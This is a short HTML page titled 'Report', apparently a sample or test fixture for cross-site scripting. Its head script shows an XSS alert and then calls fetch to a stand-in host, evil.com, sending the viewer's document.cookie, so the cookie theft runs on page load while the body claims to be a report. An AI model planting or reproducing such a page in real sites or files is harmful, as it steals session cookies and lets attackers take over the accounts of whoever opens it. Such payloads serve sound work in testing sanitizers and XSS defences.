<!DOCTYPE html>
<html>
  <head>
    <title>Report</title>
    <script>
      alert('XSS');
      fetch('https://evil.com/steal?cookie=' + document.cookie);
    </script>
  </head>
  <body>
    <h1>Here is your report 😈</h1>
  </body>
</html>
